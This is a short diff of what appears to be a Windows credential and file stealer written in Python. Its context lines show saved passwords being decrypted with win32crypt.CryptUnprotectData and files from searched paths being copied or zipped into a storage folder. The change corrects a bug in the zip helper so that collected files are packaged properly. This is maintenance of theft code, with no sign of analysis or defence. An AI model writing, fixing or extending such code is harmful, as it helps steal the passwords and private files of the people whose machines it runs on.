@@ -281,7 +281,7 @@ def decrypt_data(data, key):
     except:
         return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
 
-def zip_to_storage(name, source, destination):
+def zip_to_storage(name, source, destination=""):
     if os.path.isfile(source):
         with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
             z.write(source, os.path.basename(source))
@@ -596,7 +596,7 @@ for path in PATHS_TO_SEARCH:
                                 if os.path.isfile(realpath):
                                     shutil.copy(realpath, STORAGE_PATH)
                                 else:
-                                    zip_to_storage(realpath, STORAGE_PATH)
+                                    zip_to_storage("misc", realpath, STORAGE_PATH)
                             except:
                                 pass
 
